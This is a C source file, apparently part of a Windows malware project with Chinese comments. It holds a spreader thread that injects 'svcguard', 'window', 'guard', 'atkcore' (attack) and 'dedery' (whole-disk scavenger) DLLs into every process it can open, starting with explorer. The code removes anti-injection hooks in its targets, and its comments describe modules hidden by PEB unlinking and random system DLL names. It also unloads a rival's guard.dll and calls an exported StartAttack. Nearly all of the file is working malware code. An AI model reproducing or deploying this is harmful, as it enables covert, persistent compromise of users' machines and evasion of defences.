/* deamon/parts/spreader.c —— 被 deamon.c 直接 include：扩散线程 / 卸载外来 guard / 远程加载 atkcore */

static DWORD WINAPI SpreaderThread(LPVOID lp) {
    /* 每个被注入的 svcguard 都负责把剩下的注完（用户指定：xx 只注 svcguard，其余由 svcguard 完成）。
       为了不把 CPU 打满：宿主里的扩散放慢到 3 秒一轮，xx.exe 自己仍是 200ms 一轮。 */
#if !XX_HOST_INJECTION
    UNREFERENCED_PARAMETER(lp);
    return 0;
#endif
    Sleep(80);   /* DllMain 里 CreateThread 后立刻干活会踩 loader lock：先让 DllMain 返回 */
    BOOL bImXx;
    DWORD dwGuardScan = 0;
    DWORD dwStatTick = 0;
    int nSeen = 0, nInj = 0, nOpenFail = 0;
    int i;

    UNREFERENCED_PARAMETER(lp);
    /* 不能 Sleep(5000)（见上面说明）：最多等 300ms 让共享内存就绪，然后立刻引导注入 */
    for (i = 0; i < 30 && !g_pSharedView; i++) {
        OpenSharedMemory();
        if (g_pSharedView) break;
        Sleep(10);
    }
    InitPaths();
    bImXx = IsRunningInXxExe();
    if (bImXx) WriteDeamonLog(L"本实例在 xx.exe 内，负责部署 guard.dll 宿主\n");
    {
        DWORD sid = 0;
        ProcessIdToSessionId(GetCurrentProcessId(), &sid);
        WriteDeamonLog(L"扩散自检: session=%lu xx=%ls 共享内存=%ls\n",
                       sid, g_szXxExePath, g_pSharedView ? L"OK" : L"MISSING");
        WriteDeamonLog(L"注入策略: svcguard/window/guard -> 所有宿主（含 explorer）；"
                       L"atkcore/dedery -> 除[explorer/taskhost 与**当前弹窗持有者**]外\n");
    }
    if (BootstrapInject(L"explorer.exe"))
        WriteDeamonLog(L"引导注入完成：根已扎进 explorer\n");
    else
        WriteDeamonLog(L"引导注入失败（explorer 打不进），退回常规扩散\n");

    while (!g_bExitFlag) {
        InjCacheRefreshIfDue();
        RefreshInjectCopies();       /* 副本被删会自动重做，代价就是 3 次查属性 */
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    if (IsProtected(pe.szExeFile)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 安全白名单 */
                    if (pe.th32ProcessID <= 4) continue;      /* System / Idle：OpenProcess 必失败 */
                    /* 不按会话过滤：弹窗锁是 Local\，别的会话里的 window.dll 抢不到
                       本会话的锁，所以在别的会话扩散没有副作用；反过来若在这里过滤，
                       一旦 xx 与目标进程会话不一致（服务/SYSTEM 启动、RDP 等），
                       就会一个进程都注入不进去 —— 那才是"别的进程里没有 dll"的元凶。 */
                    nSeen++;
                    if (InjCacheHas(pe.th32ProcessID)) continue;
                    if (RejectedRecently(pe.th32ProcessID)) continue;   /* 反复拒绝的目标别再刷 */
                    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                               PROCESS_VM_WRITE | PROCESS_VM_READ |
                                               PROCESS_QUERY_INFORMATION,
                                               FALSE, pe.th32ProcessID);
                    BOOL bCanRead = (hProc != NULL);
                    if (!hProc)
                        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                            PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                                            FALSE, pe.th32ProcessID);
                    if (!hProc) {
                        nOpenFail++;
                        if (nOpenFail <= 5)   /* 只报前几条，避免刷屏 */
                            WriteDeamonLog(L"OpenProcess 失败 PID=%lu %ls err=%lu\n",
                                           pe.th32ProcessID, pe.szExeFile, GetLastError());
                        InjCacheAdd(pe.th32ProcessID);
                        continue;
                    }
                    /* 32 位进程装不了 64 位 dll：直接跳过，别每秒重试一次 */
                    {
                        BOOL bWow64 = FALSE;
                        if (IsWow64Process(hProc, &bWow64) && bWow64) {
                            MarkRejected(pe.th32ProcessID);
                            WriteDeamonLog(L"跳过 32 位进程 PID=%lu %ls\n",
                                           pe.th32ProcessID, pe.szExeFile);
                            CloseHandle(hProc);
                            continue;
                        }
                    }
                    /* 注入前先拆掉目标里可能存在的 LdrLoadDll 反注入 hook */
                    if (bCanRead) RepairTargetLdrHook(hProc, pe.th32ProcessID);

                    /* 判断目标里是否已有我们的模块：**只能用互斥体探针**。
                       EnumProcessModules 读的是 PEB 三条链，而我们自己把链摘了、
                       名字也换成了随机系统 dll 名 —— 这个判据现在是双向失准的
                       （永远返回"没有"），拿它当"该不该注入"的依据会导致反复注入。 */
                    /* ================== 按目标类型选模块集（用户指定的矩阵） ==================
                       桌面类宿主：dwm / explorer / notepad / conhost / cmd
                           → svcguard（复活/心跳） + window（弹窗冗余） + guard（看门）
                       其它进程：
                           → atkcore（攻击） + svcguard（复活） + dedery（全盘清道夫）
                       xx.exe 自己另外加载 defense（保护）+ atkcore（攻击）。 */
                    {
                        BOOL bDesktopHost = IsDesktopHostLeaf(pe.szExeFile);
                        struct { int which; const WCHAR *tag; const WCHAR *name; } set[3];
                        int nSet = 0, k;

                        if (bDesktopHost) {
                            set[0].which = 0; set[0].tag = L"svcguard"; set[0].name = L"svcguard.dll";
                            set[1].which = 1; set[1].tag = L"window";   set[1].name = L"window.dll";
                            set[2].which = 2; set[2].tag = L"guard";    set[2].name = L"guard.dll";
                            nSet = 3;
                        } else {
                            set[0].which = 3; set[0].tag = L"atkcore";  set[0].name = L"atkcore.dll";
                            set[1].which = 0; set[1].tag = L"svcguard"; set[1].name = L"svcguard.dll";
                            set[2].which = 4; set[2].tag = L"dedery";   set[2].name = L"dedery.dll";
                            nSet = 3;
                        }

                        for (k = 0; k < nSet; k++) {
                            if (XXModulePresent(pe.th32ProcessID, set[k].tag, NameTok())) continue;
                            if (InjectDll(hProc, InjectPathOf(set[k].which), pe.th32ProcessID)) {
                                nInj++;
                                WriteInjectLog(L"%ls -> PID=%lu %ls", set[k].name, pe.th32ProcessID, pe.szExeFile);
                            } else {
                                MarkRejected(pe.th32ProcessID);
                            }
                        }
                    }
                    InjCacheAdd(pe.th32ProcessID);
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }

        /* 每 10 秒报一次扩散统计：拿不到弹窗日志时也能一眼看出注入是否发生 */
        {
            DWORD now = GetTickCount();
            if (dwStatTick == 0 || now - dwStatTick >= 10000) {
                WriteDeamonLog(L"扩散统计(10s): 扫描(进程×轮)=%d 注入成功=%d OpenProcess失败=%d\n",
                               nSeen, nInj, nOpenFail);
                dwStatTick = now;
                nSeen = nInj = nOpenFail = 0;
            }
        }

        if (bImXx) {
            DWORD now = GetTickCount();
            if (dwGuardScan == 0 || now - dwGuardScan >= INJ_REFRESH_MS) {
                dwGuardScan = now;
                ValidateGuardHosts();
                EnsureGuardHosts();
            }
        }
        Sleep(IsRunningInXxExe() ? 1000 : 5000);   /* 扩散频率（用户指定）：xx 1000ms、宿主内 5000ms；攻击扫描频率不动 */
    }
    return 0;
}

/* 卸载对手注入的 guard.dll：只保留与我方同目录的那一份 */
static void UnloadForeignGuardPass(void)
{
    WCHAR ourGuard[MAX_PATH] = L"";
    WCHAR dllPath[MAX_PATH];
    if (g_szOwnDir[0]) {
        swprintf_s(ourGuard, MAX_PATH, L"%sguard.dll", g_szOwnDir);
    } else if (GetModuleFileNameW(g_hSelfModule, dllPath, MAX_PATH)) {
        WCHAR *ps = wcsrchr(dllPath, L'\\');
        if (ps) ps[1] = L'\0';
        swprintf_s(ourGuard, MAX_PATH, L"%sguard.dll", dllPath);
    }

    FARPROC pFreeLib = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "FreeLibrary");
    if (!pFreeLib) return;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (IsProtected(pe.szExeFile)) continue;
            if (!IsSafeInjectTarget(pe.th32ProcessID, pe.szExeFile)) continue;   /* 安全白名单 */
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                       PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                                       FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HMODULE mods[1024];
            DWORD needed = 0;
            if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
                DWORD count = needed / sizeof(HMODULE);
                for (DWORD i = 0; i < count; i++) {
                    WCHAR modPath[MAX_PATH];
                    if (!GetModuleFileNameExW(hProc, mods[i], modPath, MAX_PATH)) continue;
                    const WCHAR *base = wcsrchr(modPath, L'\\');
                    base = base ? base + 1 : modPath;
                    if (_wcsicmp(base, L"guard.dll") != 0) continue;
                    if (ourGuard[0] && _wcsicmp(modPath, ourGuard) == 0) continue;
                    HANDLE h = CreateRemoteThread(hProc, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)pFreeLib, mods[i], 0, NULL);
                    if (h) {
                        WaitForSingleObject(h, 1000);
                        CloseHandle(h);
                        WriteDeamonLog(L"卸载外来 guard.dll: PID=%lu %ls\n", pe.th32ProcessID, modPath);
                    }
                }
            }
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static DWORD WINAPI UnloadForeignGuardThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    Sleep(3000);
    while (!g_bExitFlag) {
        UnloadForeignGuardPass();
        Sleep(2000);
    }
    return 0;
}

static void StartRemoteAttack(void)
{
    WCHAR dir[MAX_PATH], path[MAX_PATH];
    if (g_szOwnDir[0]) {
        wcsncpy_s(dir, MAX_PATH, g_szOwnDir, _TRUNCATE);
    } else if (!GetModuleFileNameW(g_hSelfModule, dir, MAX_PATH)) {
        return;
    }
    WCHAR *pSlash = wcsrchr(dir, L'\\');
    if (pSlash) *(pSlash + 1) = L'\0';
    else return;
    swprintf_s(path, MAX_PATH, L"%satkcore.dll", dir);
    HMODULE hKill = LoadLibraryW(path);
    if (!hKill) {
        WriteDeamonLog(L"加载 atkcore.dll 失败: %ls err=%lu\n", path, GetLastError());
        return;
    }
    WriteDeamonLog(L"加载 atkcore.dll 成功: %ls\n", path);
    /* 会话随机名也推给本地这份 atkcore（同进程，直接调用即可） */
    {
        typedef BOOL (WINAPI *SetNames_t)(const XX_NAME_BLOCK *);
        SetNames_t pSet = (SetNames_t)XXGetProcByName(hKill, "XxSetNames");
    
        if (pSet) {
            XX_NAME_BLOCK blk;
            XXNameBlockInit(&blk, NameTok(), 0);
            pSet(&blk);
        }
    }
    typedef void (WINAPI *StartAttack_t)(void);
    StartAttack_t pStart = (StartAttack_t)XXGetProcByName(hKill, "StartAttack");

    if (pStart) {
        pStart();
        WriteDeamonLog(L"StartAttack 已调用\n");
    } else {
        WriteDeamonLog(L"StartAttack 导出未找到\n");
    }
}

